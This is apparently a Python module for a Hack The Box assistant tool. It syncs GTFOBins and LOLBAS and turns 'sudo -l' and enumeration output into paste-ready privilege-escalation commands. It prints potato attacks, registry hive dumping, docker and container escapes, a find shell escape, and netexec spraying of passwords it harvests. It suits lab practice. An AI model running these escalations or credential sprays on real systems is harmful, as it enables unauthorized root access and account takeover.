"""Self-updating privilege-escalation knowledge: GTFOBins and LOLBAS.

Why this exists
---------------
The hint ladder in `htb.py` can tell you "check sudo -l, then look it up on
GTFOBins". That is the correct advice and it is also one browser tab short of
being useful at 2am. This module keeps a local copy of GTFOBins and LOLBAS so
the answer can be the actual command:

    sudo -l  →  (root) NOPASSWD: /usr/bin/find
    →  sudo find . -exec /bin/sh \\; -quit

Both projects are public, permissively licensed, and updated constantly as new
binaries are found — which is exactly why this is a refresh button rather than
a table baked into the source. A privesc lookup that is two years stale will
miss the binary the box was built around.

Nothing here contacts Hack The Box. These are generic technique databases; the
HTB-specific part is only that the tool knows when to look something up.
"""

from __future__ import annotations

import json
import re
import time
from pathlib import Path

from .config import ARTIFACT_DIR

STORE = Path(ARTIFACT_DIR).parent / "htb-knowledge"
GTFO_FILE = STORE / "gtfobins.json"
LOLBAS_FILE = STORE / "lolbas.json"

GTFO_REPO = "https://github.com/GTFOBins/GTFOBins.github.io.git"
LOLBAS_REPO = "https://github.com/LOLBAS-Project/LOLBAS.git"

# The functions that actually matter when you are escalating. GTFOBins lists
# many more (file-read, library-load, and so on) but these are the ones that
# turn "I have sudo on this" into a shell, so they sort first.
PRIORITY_FUNCTIONS = ("shell", "sudo", "suid", "capabilities",
                      "limited-suid", "command", "file-write", "file-read")


def _load(path: Path) -> dict:
    try:
        return json.loads(path.read_text())
    except (OSError, json.JSONDecodeError):
        return {}


def status() -> dict:
    """What the UI shows next to the update button."""
    out = {}
    for name, path in (("gtfobins", GTFO_FILE), ("lolbas", LOLBAS_FILE)):
        data = _load(path)
        entries = len(data.get("entries", {}))
        updated = data.get("updated_at", 0)
        out[name] = {
            "entries": entries,
            "updated_at": updated,
            "age_seconds": (time.time() - updated) if updated else None,
            "present": entries > 0,
        }
    return out


# ------------------------------------------------------------------ parsing

def _front_matter(text: str) -> dict:
    """Parse a GTFOBins entry.

    These look like Jekyll front matter but are not: the block opens with `---`
    and closes with `...`, YAML's end-of-document marker, and all 478 entries in
    the repository do it that way — there is no second `---` to split on. So the
    whole file is one YAML document and `safe_load` handles it directly.

    Worth stating because splitting on `---` looks obviously right, returns
    empty for every single file, and fails silently: you get a working parser
    that finds nothing.
    """
    import yaml

    try:
        data = yaml.safe_load(text)
    except yaml.YAMLError:
        return {}
    return data if isinstance(data, dict) else {}


def parse_gtfobins(repo: Path) -> dict[str, dict]:
    """Read `_gtfobins/*` into {binary: {function: [commands]}}.

    Two things about the real repository that a reasonable guess gets wrong,
    both found by running this against a clone rather than trusting the shape:

      * the entries have no file extension — `_gtfobins/find`, not `find.md`;
      * each function carries per-context variants, and the `suid` variant is
        frequently *not* the same command as the base one (`find . -exec
        /bin/sh -p \\; -quit` keeps the effective UID; the base version drops
        it and hands you a useless shell). Both are kept, labelled.
    """
    out: dict[str, dict] = {}
    src = repo / "_gtfobins"
    if not src.is_dir():
        return out

    for path in sorted(src.iterdir()):
        if not path.is_file() or path.name.startswith("."):
            continue
        try:
            data = _front_matter(path.read_text(encoding="utf-8", errors="replace"))
        except OSError:
            continue

        functions = data.get("functions")
        if not isinstance(functions, dict):
            continue

        collected: dict[str, list[str]] = {}
        inherits: set[str] = set()
        for fname, entries in functions.items():
            if not isinstance(entries, list):
                continue
            cmds: list[dict] = []
            for entry in entries:
                if not isinstance(entry, dict):
                    continue
                # `inherit` entries carry `from: <other binary>` — see below.
                if str(fname) == "inherit" and entry.get("from"):
                    inherits.add(str(entry["from"]))
                base = (entry.get("code") or "").strip()
                note = (entry.get("comment") or "").strip()
                if base:
                    cmds.append({"code": base, "note": note})
                contexts = entry.get("contexts")
                if isinstance(contexts, dict):
                    for ctx, override in contexts.items():
                        if isinstance(override, dict) and override.get("code"):
                            variant = override["code"].strip()
                            if variant and variant != base:
                                cmds.append({
                                    "code": variant,
                                    "note": f"use this one under {ctx}"})
            if cmds:
                collected[str(fname)] = cmds
        if collected:
            collected["_inherits"] = sorted(inherits)  # resolved below
            out[path.name] = collected

    return _resolve_inheritance(out)


def _resolve_inheritance(entries: dict[str, dict]) -> dict[str, dict]:
    """Record what a binary inherits — without copying the parent's commands.

    GTFOBins does not repeat itself: `vim` lists only `file-read` plus
    `inherit: {from: vi, from: lua, from: python}`, and the shell escape people
    actually want lives on those.

    The tempting fix is to copy the parent's command into the child. That is
    wrong, and quietly so: lua's escape is `lua -e 'os.execute("/bin/sh")'`,
    which is not a vim command and will not work if you paste it. What vim
    inherits is the *capability* — it can evaluate lua — and the invocation
    that reaches it is vim's own `vim -c ':lua ...'`, which the `inherit` entry
    already carries.

    So this keeps the child's real invocation and attaches a pointer to where
    the payload comes from. A correct hint that needs one more step beats a
    copy-pasteable command that fails.
    """
    for name, funcs in entries.items():
        parents = funcs.pop("_inherits", [])
        if not parents:
            continue
        for parent in parents:
            src = entries.get(parent) or {}
            gained = [f for f in src if f not in ("inherit", "_inherits")
                      and f not in funcs]
            if not gained:
                continue
            funcs.setdefault("inherit", []).append({
                "code": f"# {name} can execute {parent} — see the {parent} entry",
                "note": (f"{parent} additionally offers: {', '.join(sorted(gained))}. "
                         f"Combine it with {name}'s invocation above."),
                "see_also": parent,
            })
    for funcs in entries.values():
        funcs.pop("_inherits", None)
    return entries


def parse_lolbas(repo: Path) -> dict[str, dict]:
    """Read LOLBAS YAML into {binary: {category: [commands]}}."""
    out: dict[str, dict] = {}
    for path in sorted(repo.rglob("*.yml")):
        if "yml" not in path.suffix:
            continue
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        name = path.stem
        cmds = re.findall(r"^\s*-?\s*Command:\s*(.+)$", text, re.M)
        cats = re.findall(r"^\s*Category:\s*(.+)$", text, re.M)
        if not cmds:
            continue
        bucket: dict[str, list[dict]] = {}
        for i, c in enumerate(cmds):
            cat = (cats[i] if i < len(cats) else "misc").strip()
            bucket.setdefault(cat, []).append(
                {"code": c.strip().strip("'\""), "note": ""})
        out[name] = bucket
    return out


# ------------------------------------------------------------------ lookups

def _first_code(ordered: list) -> str:
    """The single command to show, skipping pointer-only `inherit` entries."""
    for fname, cmds in ordered:
        if fname == "inherit":
            continue
        for c in cmds:
            code = c.get("code") if isinstance(c, dict) else str(c)
            if code and not code.startswith("#"):
                return code
    return ""


def lookup(binary: str, *, platform: str = "linux") -> dict:
    """The escalation for one binary, ready to paste.

    Accepts a bare name or a full path, because `sudo -l` prints paths and
    people paste what they see.
    """
    name = (binary or "").strip().strip("*").split("/")[-1].lower()
    name = re.sub(r"\.(exe|sh|py|pl)$", "", name)
    if not name:
        return {"found": False, "binary": binary, "commands": {}}

    file = LOLBAS_FILE if platform.startswith("win") else GTFO_FILE
    data = _load(file).get("entries", {})
    # LOLBAS keys are CamelCase filenames; compare case-insensitively.
    hit = data.get(name) or next(
        (v for k, v in data.items() if k.lower() == name), None)
    if not hit:
        return {"found": False, "binary": name, "commands": {},
                "note": ("no entry — that does not mean it is not exploitable, "
                         "only that it is not a known one. Check whether it "
                         "calls another binary by relative path.")}

    ordered = sorted(
        hit.items(),
        key=lambda kv: (PRIORITY_FUNCTIONS.index(kv[0])
                        if kv[0] in PRIORITY_FUNCTIONS else 99, kv[0]))
    return {
        "found": True,
        "binary": name,
        "platform": "windows" if platform.startswith("win") else "linux",
        "commands": dict(ordered),
        "best": _first_code(ordered),
        "source": ("https://lolbas-project.github.io/" if platform.startswith("win")
                   else f"https://gtfobins.github.io/gtfobins/{name}/"),
    }


def parse_sudo_l(text: str) -> list[dict]:
    """Turn pasted `sudo -l` output into ready-to-run escalations.

    This is the single highest-value lookup in the whole HTB flow: `sudo -l` is
    the first command anyone runs after getting a shell, and its output is a
    list of paths that either are or are not in GTFOBins. Doing that join
    automatically removes the step where you squint at the output and then go
    searching.
    """
    results = []
    seen = set()
    for m in re.finditer(r"(?:\(([^)]*)\))?\s*(?:NOPASSWD:\s*)?(/[\w/\.\-]+)", text or ""):
        runas, path = m.group(1) or "root", m.group(2)
        binary = path.split("/")[-1]
        if binary in seen:
            continue
        seen.add(binary)
        hit = lookup(binary, platform="linux")
        entry = {
            "path": path,
            "runas": runas.strip(),
            "binary": binary,
            "exploitable": hit.get("found", False),
        }
        if hit.get("found"):
            best = hit.get("best", "")
            # GTFOBins writes its examples as `sudo <binary> ...`; substitute
            # the real path so the command works when it is not on $PATH.
            entry["command"] = best.replace(f"sudo {binary}", f"sudo {path}") if best else ""
            entry["all"] = hit.get("commands", {})
            entry["source"] = hit.get("source", "")
        else:
            entry["note"] = ("Not in GTFOBins. Look at what it executes — a "
                             "script or a binary calling something by relative "
                             "path is still a path to root.")
        results.append(entry)

    results.sort(key=lambda r: (not r["exploitable"], r["binary"]))
    return results


def suggest_from_shell_output(text: str) -> list[dict]:
    """Scan any post-shell enumeration output for things worth acting on.

    Deliberately conservative: it flags what it recognises and says why, rather
    than claiming a finding. On a hard box the interesting line is usually
    something a script printed in white, not red.
    """
    hits: list[dict] = []
    t = text or ""

    checks = [
        (r"SeImpersonatePrivilege\s+.*Enabled", "windows",
         "SeImpersonatePrivilege is enabled",
         "A potato attack gives SYSTEM. This is the most common Windows path on HTB.",
         "PrintSpoofer.exe -i -c cmd    or    GodPotato -cmd cmd"),
        (r"SeBackupPrivilege\s+.*Enabled", "windows",
         "SeBackupPrivilege is enabled",
         "You can read any file, including the registry hives.",
         "reg save hklm\\sam sam.hiv & reg save hklm\\system system.hiv"),
        (r"AlwaysInstallElevated.*0x1", "windows",
         "AlwaysInstallElevated is set",
         "An MSI installs as SYSTEM when both HKLM and HKCU keys are 1.",
         "msiexec /quiet /qn /i evil.msi"),
        (r"/\.dockerenv|docker|kubepods", "linux",
         "You are inside a container",
         "Rooting the container is not rooting the box — find the escape.",
         "cat /proc/1/cgroup; ls -la /var/run/docker.sock; capsh --print"),
        (r"\bCapEff:\s*0000003fffffffff", "linux",
         "Full capabilities — this is a privileged container",
         "CAP_SYS_ADMIN means you can mount the host filesystem.",
         "fdisk -l; mkdir /mnt/h; mount /dev/sda1 /mnt/h"),
        (r"^\s*docker\b|\(docker\)|\blxd\b", "linux",
         "Membership of docker or lxd",
         "That group is root-equivalent by design.",
         "docker run -v /:/host -it alpine chroot /host sh"),
        (r"cap_setuid|cap_dac_read_search|cap_sys_admin", "linux",
         "A binary carries Linux capabilities",
         "Capabilities are missed far more often than SUID bits.",
         "getcap -r / 2>/dev/null   — then look the binary up in GTFOBins"),
        (r"NOPASSWD", "linux",
         "A NOPASSWD sudo rule exists",
         "Paste the full sudo -l output into the lookup for the exact command.",
         "sudo -l"),
    ]
    for pattern, platform, title, why, cmd in checks:
        if re.search(pattern, t, re.I | re.M):
            hits.append({"title": title, "platform": platform,
                         "why": why, "command": cmd})

    # Anything that looks like a credential is worth surfacing — on hard boxes
    # the chain link is almost always a password in a file nobody expected.
    for m in re.finditer(
            # `\b(password)` does not match `db_password`: underscore is a word
            # character, so there is no boundary before the keyword. Since
            # prefixed names — db_password, ADMIN_PASSWORD, smtp_secret — are
            # the overwhelmingly common form in real config files, the anchored
            # version quietly found almost nothing.
            r"(?i)[\w.\-]*?(password|passwd|pwd|secret|api[_-]?key|token)\b"
            r"\s*[=:]\s*[\"']?([^\s\"',]{4,80})",
            t):
        hits.append({
            "title": f"Possible credential: {m.group(1)}",
            "platform": "any",
            "why": "Try it against every user and every service on the box — "
                   "reuse is the intended path more often than not.",
            "command": f"netexec smb <host> -u users.txt -p '{m.group(2)}' "
                       f"--continue-on-success",
        })

    return hits[:40]


# ------------------------------------------------------------------ refresh

async def _clone(url: str, dest: Path, timeout: int = 600) -> tuple[bool, str]:
    """Shallow clone or fast-forward. Never raises."""
    import asyncio
    import shutil as _sh

    if not _sh.which("git"):
        return False, "git is not installed in this image"

    argv = (["git", "-C", str(dest), "pull", "--ff-only", "--depth", "1"]
            if (dest / ".git").is_dir()
            else ["git", "clone", "--depth", "1", "--quiet", url, str(dest)])
    dest.parent.mkdir(parents=True, exist_ok=True)
    try:
        proc = await asyncio.create_subprocess_exec(
            *argv, stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT)
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        return False, f"timed out after {timeout}s"
    except OSError as exc:
        return False, str(exc)
    text = out.decode("utf-8", "replace")[-300:]
    return (proc.returncode == 0), text


async def refresh() -> list[dict]:
    """Update both databases. Each is independent — one failing keeps the other.

    Returns a per-source report in the same shape the content updater uses, so
    the freshness panel can render them without a special case.
    """
    results = []
    STORE.mkdir(parents=True, exist_ok=True)

    for name, url, parser, out_file in (
        ("gtfobins", GTFO_REPO, parse_gtfobins, GTFO_FILE),
        ("lolbas", LOLBAS_REPO, parse_lolbas, LOLBAS_FILE),
    ):
        started = time.time()
        repo = STORE / name
        ok, detail = await _clone(url, repo)
        if not ok:
            results.append({"name": name, "kind": "knowledge", "ok": False,
                            "skipped": False, "detail": detail, "items": 0,
                            "seconds": round(time.time() - started, 1)})
            continue
        try:
            entries = parser(repo)
        except (OSError, ValueError) as exc:
            results.append({"name": name, "kind": "knowledge", "ok": False,
                            "skipped": False, "detail": f"parse failed: {exc}",
                            "items": 0,
                            "seconds": round(time.time() - started, 1)})
            continue

        # Only overwrite when the parse produced something. A refactor upstream
        # that breaks the parser should leave you with the old database, not an
        # empty one — silently losing your privesc lookups mid-box is worse
        # than running on last week's copy.
        if entries:
            try:
                out_file.write_text(json.dumps(
                    {"updated_at": time.time(), "entries": entries}))
            except OSError as exc:
                results.append({"name": name, "kind": "knowledge", "ok": False,
                                "skipped": False, "detail": str(exc), "items": 0,
                                "seconds": round(time.time() - started, 1)})
                continue

        results.append({
            "name": name, "kind": "knowledge", "ok": bool(entries),
            "skipped": False,
            "detail": (f"{len(entries)} binaries" if entries
                       else "parsed 0 entries — kept the previous copy"),
            "items": len(entries),
            "seconds": round(time.time() - started, 1),
        })
    return results
